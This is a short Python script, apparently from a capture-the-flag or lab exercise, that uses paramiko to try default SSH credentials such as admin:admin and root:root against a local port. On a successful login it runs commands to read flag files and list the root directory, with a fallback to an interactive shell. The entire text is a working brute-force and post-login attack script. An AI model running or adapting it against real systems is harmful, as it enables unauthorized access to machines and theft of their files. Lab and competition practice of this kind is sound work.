import paramiko, time
pairs = [('audit','probe'),('admin','admin'),('root','root'),('test','test'),('user','user'),('guest','guest'),('lab','lab'),('ctf','ctf')]
for u,p in pairs:
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect('127.0.0.1', port=2222, username=u, password=p, timeout=1.5, allow_agent=False, look_for_keys=False, banner_timeout=2)
        print('[SUCCESS]', u+':'+p)
        try:
            si,so,se = c.exec_command('id; cat /flag* /flag.txt /home/*/flag* 2>/dev/null; ls -a /', timeout=2)
            print(so.read().decode(errors='replace'))
        except Exception as e2:
            print('exec failed:', e2)
            try:
                ch = c.invoke_shell()
                time.sleep(1)
                if ch.recv_ready():
                    print(ch.recv(4096).decode(errors='replace'))
            except Exception as e3:
                print('shell failed:', e3)
        c.close()
        break
    except paramiko.AuthenticationException:
        print('[FAIL]', u+':'+p)
    except Exception as e:
        print('[ERR]', u+':'+p, type(e).__name__, str(e)[:80])
"

